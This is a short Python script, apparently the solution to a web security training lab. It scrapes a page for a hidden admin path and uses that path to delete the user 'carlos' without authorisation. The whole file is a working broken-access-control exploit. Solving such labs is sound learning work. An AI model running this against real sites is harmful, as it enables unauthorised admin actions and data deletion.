import requests
import re
import sys

def get_session_cookie(url):
    response = requests.get(url)
    cookies = response.cookies
    return cookies

def get_admin_endpoint(url, cookies):
    response = requests.get(url, cookies=cookies)
    match = re.search(r'/admin-[a-z0-9]{6}', response.text)
    if match:
        return match.group(0)
    return None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]

    cookies = get_session_cookie(burp_url)
    admin_endpoint = get_admin_endpoint(burp_url, cookies)
    if admin_endpoint:
        admin_url = burp_url.rstrip('/') + admin_endpoint + '/delete?username=carlos'
        response = requests.get(admin_url, cookies=cookies)
    else:
        print("Admin endpoint not found")
